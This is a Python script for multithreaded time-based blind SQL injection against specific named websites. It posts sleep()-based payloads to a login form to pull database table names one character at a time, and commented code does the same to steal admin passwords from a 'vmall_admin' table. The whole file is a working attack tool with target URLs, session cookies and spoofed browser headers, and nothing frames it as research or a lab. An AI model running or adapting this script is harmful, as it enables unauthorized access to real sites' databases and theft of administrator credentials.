import threading
import requests
import time
url = "http://hello.hiddore.life/Home/Index/login.html"
path = "./a.txt"
#file = open("C:\\Users\\GalaXY\\Desktop\\8.txt","w+")
number = 40
# header = {
#                 'Host': 'jl.fangxingou666.com',
#                 'Upgrade-Insecure-Requests': '1',
#                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
#                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
#                 'Accept-Encoding': 'gzip, deflate',
#                 'Accept-Language': 'zh-CN,zh;q=0.9',
#                 'Cookie': 'PHPSESSID=6bt7om0n6b9k0i0v1mrqd25e24',
#                 'Connection': 'close'
#             }

#rs = []*number
# for opo in range(1,100):
#     print("第"+str(opo)+"个字段：")
#     for i in range(1,40):
#         for a in open(path,"r"):
#         #for b in range(32,126):  SELECT COLUMN_NAME name , COLUMN_TYPE type, COLUMN_COMMENT comment FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'huaxia' AND TABLE_NAME = 'vmall_admin';

#             #http://jl.fangxingou666.com/index.php/Home/List/index?f=123)%20AND%20(SELECT%203442%20FROM%20(SELECT(if(substr((select%20table_name%20from%20information_schema.tables%20limit%200,1),1,1)=%27c%27,sleep(22),1)))XVlv)%20AND%20(9406=9406
#             b=a.strip('\n')   # f=123) AND (SELECT 3442 FROM (SELECT(if(substr((select table_name from information_schema.tables limit 0,1),1,1)='g',sleep(22),1)))XVlv) AND (9406=9406
#             data = "?f=123)%20AND%20(SELECT%203442%20FROM%20(SELECT(if(substr((SELECT admin_pwd FROM vmall_admin%20limit%20"+str(opo)+",1),"+str(i)+",1)=\'"+b+"\',sleep(25),1)))XVlv)%20AND%20(9406=9406"
#             kkkk = url + data
#             time.sleep(0.2)
            
#             try:
#                 resp = requests.get(kkkk,headers=header,timeout=25)
            
#             except:
#                 print(b)
#                 break
#         print("")
ouooo = 1

def saomiao(i,ooi,ouoo):
    for a in open(path,"r"):
    #for b in range(32,126):  SELECT COLUMN_NAME name , COLUMN_TYPE type, COLUMN_COMMENT comment FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'huaxia' AND TABLE_NAME = 'vmall_admin';

        #http://jl.fangxingou666.com/index.php/Home/List/index?f=123)%20AND%20(SELECT%203442%20FROM%20(SELECT(if(substr((select%20table_name%20from%20information_schema.tables%20limit%200,1),1,1)=%27c%27,sleep(22),1)))XVlv)%20AND%20(9406=9406
        with requests.Session() as sess:
            time.sleep(0.2)
            ouoo = ouoo+1
            header = {
                'Host': 'hello.hiddore.life',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'zh-CN,zh;q=0.9',
                'Cookie': 'PHPSESSID=a69qnn21trdu18vov2pi789p24'+str(ouoo),
                'Connection': 'close'
            }
            b=a.strip('\n')   # f=123) AND (SELECT 3442 FROM (SELECT(if(substr((select table_name from information_schema.tables limit 0,1),1,1)='g',sleep(22),1)))XVlv) AND (9406=9406
            data = "password = g00dPa$$w0rD & pic_code = 94102 & username = aaaa')%20AND%20(SELECT%203986%20FROM%20(SELECT(if(substr((select table_name from information_schema.tables%20limit%20"+str(
                ooi)+",1),"+str(i)+",1)=\'"+b+"\',sleep(25),1)))RPXz)%20AND ('lqqK'='lqqK"
            #password = g00dPa$$w0rD & pic_code = 94102 & username = aaaa') AND (SELECT 3986 FROM (SELECT(SLEEP(5)))RPXz) AND ('lqqK'='lqqK
            #kkkk = url + data
            #sess.config['keep_alive'] = False
            try:
                resp = sess.post(url=url,data=data,headers=header,timeout=25)
            except Exception as e:
                #print(e)
                return b
                break
class MyThread(threading.Thread):
    def __init__(self,func,args):
        super(MyThread,self).__init__()
        self.func = func
        self.args = args
    def run(self):
        self.result = self.func(*self.args)
    def get_result(self):
        return self.result
#threadss = []*(number-1)
result = []
threads = []
for opo in range(1,50):
    for i in range(1,number):
        thread = MyThread(saomiao,args=(i,opo,ouooo))
        ouooo = ouooo+1
        threads.append(thread)
    for op in range(0,number-1):
        threads[op].start()
    for k in range(0,number-1):
        pop = threads[k]
        pop.join()

    for j in range(0,number-1):
        result.append(threads[j].get_result())
    for gg in range(len(result)):
        print(result[gg],end="")
    print("第n次完成")
    threads.clear()
    result.clear()

    # threads.append(thread)
# for t in threads:
#     t.join()

#file.close()
print("结束")
